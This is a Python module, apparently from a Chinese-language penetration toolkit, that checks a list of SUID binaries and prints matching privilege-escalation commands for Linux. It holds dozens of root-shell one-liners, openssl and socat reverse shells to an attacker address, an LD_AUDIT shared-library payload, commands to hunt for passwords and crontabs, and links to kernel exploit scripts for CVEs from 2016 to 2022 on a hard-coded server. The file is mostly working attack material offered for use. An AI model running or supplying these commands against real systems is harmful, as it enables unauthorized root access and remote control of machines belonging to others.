from ClassCongregation import color

txt = """
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

"""

cmd = {
    '/awk':'awk \'BEGIN {system("/bin/bash -p")}\'',
    '/bash':'bash -p',
    '/csh':'csh -b',
    '/dmesg':'dmesg -H\n!/bin/sh -p',
    '/docker':'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
    '/ed':'ed\n!/bin/sh -p',
    '/env':'env /bin/sh -p',
    '/expect':'expect -c \'spawn /bin/sh -p;interact\'',
    '/find':'find . -exec /bin/sh -p \; -quit',
    '/flock':'flock -u / /bin/sh -p',
    '/ftp':'ftp\n!/bin/sh -p',
    '/gdb':'gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
    '/gimp':'gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    '/git':'git help status //在底行输入\n!/bin/sh -p',
    '/ionice':'ionice /bin/sh -p',
    '/ip':'ip netns add foo\nip netns exec foo /bin/sh -p\nip netns delete foo',
    '/ksh':'ksh -p',
    '/less':'less /etc/profile //读取文件，在底行输入\n!/bin/sh -p',
    '/logsave':'logsave /dev/null /bin/sh -i -p',
    '/make':'COMMAND=\'/bin/sh -p\'\nmake -s --eval=$\'x:\\n\\t-\'"$COMMAND"',
    '/man':'man man //在底行输入\n!/bin/sh -p',
    '/more':'more /etc/profile //读取文件，在底行输入\n!/bin/sh -p',
    '/nano':'nano  //运行nano程序\n^R  //按下ctrl-r\n^X  //按下ctrl-x\nreset; sh -p 1>&0 2>&0  //输入命令',
    '/nice':'nice /bin/sh -p',
    '/nmap':'echo "os.execute(\'/bin/bash -p\')" > /tmp/shell.nse\nnmap --script=/tmp/shell.nse 127.0.0.1',
    '/openssl':'首先在攻击者的机器上运行下面的命令以接收连接: \nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n之后在受害者服务器上执行下面的命令: \nRHOST=192.168.1.6\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -p -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s',
    '/php':'CMD="/bin/sh"\nphp -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
    '/python2':'python2 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    '/python3':'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    '/python':'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    '/rpm':'rpm --eval \'%{lua:os.execute("/bin/sh -p")}\'',
    '/rsync':'rsync -e \'sh -p -c "sh -p 0<&2 1>&2"\' 127.0.0.1:/dev/null',
    '/rvim':'rvim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    '/setarch':'setarch $(arch) /bin/sh -p',
    '/socat':'攻击者: \nsocat file:\'/dev/tty\',raw,echo=0 tcp-listen:8888\n\n受害者: \nsocat tcp-connect:192.168.1.6:8888 exec:\'/bin/sh -p\',pty,stderr',
    '/ssh':'ssh -o ProxyCommand=\';sh -p 0<&2 1>&2\' x',
    '/strace':'strace -o /dev/null /bin/sh -p',
    '/stdbuf':'stdbuf -i0 /bin/sh -p',
    '/taskset':'taskset 1 /bin/sh -p',
    '/tclsh':'tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr',
    '/time':'time /bin/sh -p',
    '/timeout':'timeout 7d /bin/sh -p',
    '/vim':'vim -c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
    '/watch':'watch -x sh -c \'reset; exec sh -p 1>&0 2>&0\'',
    '/xargs':'xargs -a /dev/null sh -p',
    '/zsh':'zsh',
    '/ping':'cd /tmp\nmkdir exploit\nls -lh /usr/bin/ping\nln /usr/bin/ping /tmp/exploit/target\nls -ld /tmp/exploit/target\nexec 3< /tmp/exploit/target\nls -l /proc/$$/fd/3\nrm -rf /tmp/exploit/\nls -l /proc/$$/fd/3\nvim payload.c\nvoid __attribute__((constructor)) init()  // 两个下划线\n{\n     setuid(0);\n     system("/bin/bash");\n}\n\ngcc -W -fPIC -shared -o /tmp/exploit payload.c\nLD_AUDIT="\$ORIGIN" exec /proc/self/fd/3',
}
print('[*](1)输入命令查看root用户拥有的SUID文件: \nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n(2)用grep查找有密码的文件: grep --color=auto --include=\'*.php\' -rnw \'/home/www/api\' -ie "PASSWORD" --color=always 2> /dev/null\n(3)查找敏感文件: locate password | more\n(4)查看用户最后编辑的文件: find / -mmin -10 2>/dev/null | grep -Ev "^/proc"\n(5)内核提权搜索脚本: https://github.com/mzet-/linux-exploit-suggester\n(6)计划任务:\ncat /etc/crontab\nls -ld /etc/cron.d/*\nls -ld /etc/cron*\ncat /var/spool/cron/crontabs/root\ncat /var/spool/cron/root\n(7)内核提权:\nhttp://140.82.50.99:8080/cve-2016-8655/cve-2016-8655.sh\nhttp://140.82.50.99:8080/cve-2016-9793/cve-2016-9793.sh\nhttp://140.82.50.99:8080/cve-2017-1000112/cve-2017-1000112.sh\nhttp://140.82.50.99:8080/cve-2017-7308/cve-2017-7308.sh\nhttp://140.82.50.99:8080/cve-2018-5333/cve-2018-5333.sh\nhttp://140.82.50.99:8080/cve-2019-13272/cve-2019-13272.sh\nhttp://140.82.50.99:8080/cve-2021-22555/cve-2021-22555.sh\nhttp://140.82.50.99:8080/cve-2021-4034/cve-2021-4034.sh\nhttp://140.82.50.99:8080/cve-2022-0847/cve-2022-0847.sh')
def check(**kwargs):
    flag = 0
    #分割后去空处理
    lines = [line for line in txt.split('\n') if line != '']
    for line in lines:
        for key, value in cmd.items():
            if line.endswith(key):
                flag = 1
                color('[*] %s 命令存在SUID权限, 可利用其进行权限提升, 以下是具体语法: '%key.strip('/'),'green')
                print(value)
    if flag == 0:
        print('[*]未找到可利用具有SUID权限的命令, 参考链接: https://www.freebuf.com/articles/system/244627.html')
        

if __name__ == '__main__':
    #分割后去空处理
    lines = [line for line in txt.split('\n') if line != '']
    for line in lines:
        for key, value in cmd.items():
            if line.endswith(key):
                print(value)